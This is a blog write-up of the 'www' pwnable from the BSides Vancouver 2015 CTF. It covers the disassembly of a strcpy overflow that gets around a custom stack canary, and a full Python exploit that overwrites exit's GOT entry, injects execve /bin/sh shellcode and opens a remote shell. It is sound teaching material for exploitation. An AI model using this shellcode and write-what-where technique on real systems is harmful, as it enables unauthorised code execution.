---
layout: post
title: "BSides Vancouver 2015 WWW"
date: 2015-03-18 19:17:55 -0400
author: [barrebas]
comments: true
categories: [bsides vancouver]
---

### Solved by barrebas

After solving `sushi`, there were plenty of pwnables left to choose from. Next up was `www`!

`www` was a 200 point challenge and consisted of a 32-bit Linux binary. After dealing with `sushi`, I decided to inspect the binary in `gdb-peda` right away:

```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
```

Again, no protections in place. Running the binary reveals what it is trying to do:

```bash
gdb-peda$ r
Welcome to www! Please give me two strings to have them echoed back to you!
buffers at 0xffffd4c4 and 0xffffd3c4, ready for input!
AAAAAA
BBBBBB
AAAAAA

BBBBBB

Stack canary created: >tC[hbw]
Better luck next time, eh?
```

Looks like it has two buffers on the stack and a custom stack canary implementation. The vulnerable function is called `copybuf`:

```
0804873c <copybuf>:
 804873c:   55                      push   ebp
 804873d:   89 e5                   mov    ebp,esp
 804873f:   83 ec 38                sub    esp,0x38
 8048742:   c7 44 24 08 09 00 00    mov    DWORD PTR [esp+0x8],0x9
 8048749:   00 
 804874a:   c7 44 24 04 68 9d 04    mov    DWORD PTR [esp+0x4],0x8049d68 ; canary
 8048751:   08 
 8048752:   8d 45 eb                lea    eax,[ebp-0x15]
 8048755:   89 04 24                mov    DWORD PTR [esp],eax
 8048758:   e8 c3 fe ff ff          call   8048620 <strncpy@plt>
 804875d:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048760:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048764:   8d 45 db                lea    eax,[ebp-0x25]                ; first buffer is copied here
 8048767:   89 04 24                mov    DWORD PTR [esp],eax
 804876a:   e8 41 fe ff ff          call   80485b0 <strcpy@plt>
 804876f:   8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]       ; ebp+0xc = second input
 8048772:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax          
 8048776:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]       ; overflow this pointer with exit@got
 8048779:   89 04 24                mov    DWORD PTR [esp],eax
 804877c:   e8 2f fe ff ff          call   80485b0 <strcpy@plt>
 ; check_cookie:
 8048781:   c7 44 24 04 68 9d 04    mov    DWORD PTR [esp+0x4],0x8049d68 ; canary
 8048788:   08 
 8048789:   8d 45 eb                lea    eax,[ebp-0x15]
 804878c:   89 04 24                mov    DWORD PTR [esp],eax
 804878f:   e8 bc fd ff ff          call   8048550 <strcmp@plt>
 8048794:   89 45 f4                mov    DWORD PTR [ebp-0xc],eax
 8048797:   83 7d f4 00             cmp    DWORD PTR [ebp-0xc],0x0
 804879b:   74 18                   je     80487b5 <copybuf+0x79>        ; if canary check fails, call exit@plt -> overwrite
 804879d:   c7 04 24 30 8a 04 08    mov    DWORD PTR [esp],0x8048a30
 80487a4:   e8 17 fe ff ff          call   80485c0 <puts@plt>
 80487a9:   c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
 80487b0:   e8 2b fe ff ff          call   80485e0 <exit@plt>
 ; cookie_OK:
 80487b5:   c9                      leave  
 80487b6:   c3                      ret    
```

In short, the program takes two inputs and uses `strcpy()` to copy these to the stack. However, the saved return address on the stack is protected from overwriting by a custom stack canary. The way around is to exploit the buffer overflow to overwrite on of the arguments to the second `strcpy()`: the pointer to the second buffer. If we control that pointer, we basically have a write-what-where. I choose to overflow the pointer to the second buffer with the address of `exit@plt`. This way, after overwriting the stack canary, the program will try to exit, but `exit@plt` will point to attacker-controlled shellcode on the stack. 

Putting it all together:

```python
from socket import *
import struct, telnetlib, re

def p(x):
    return struct.pack('<L', x)

def pQ(x):
    return struct.pack('<Q', x)
    
s=socket(AF_INET, SOCK_STREAM)
#s.connect(('localhost', 17284))
s.connect(('www.termsec.net', 17284))

buf = s.recv(200)

m = re.findall('(0x[0-9a-f]+)', buf)
buf1_addr = int(m[0], 16)
buf2_addr = int(m[1], 16)

print "[~] buf1: 0x%lx" % buf1_addr
print "[~] buf2: 0x%lx" % buf2_addr

# first input will overwrite the pointer that is used for the second strcpy 
payload = ""
payload += "A"*45       # padding
payload += p(0x8049d10) # we'll overwrite exit@plt
payload += p(buf2_addr) # restore this on the stack, otherwise it will be partially overwritten

s.send(payload + "\n")

# second input, used in second strcpy. By now, that strcpy will call:
# strcpy(0x8049d10, buffer2)
payload = ""
payload += p(buf2_addr+4)   # overwrite exit@plt with the address where the shellcode starts
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"

s.send(payload + "\n")
s.recv(200)

print "[!] enjoy your shell"

t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
```

```bash
bas@tritonal:~/tmp/yvrctf/www-200$ python ./www.py
[~] buf1: 0xbfa660d4
[~] buf2: 0xbfa65fd4

[!] enjoy your shell
id
/bin//sh: 1: id: not found
cat flag.txt
flag{K33P_ST4T1C_L1K3_W00L_F4BR1C}
```

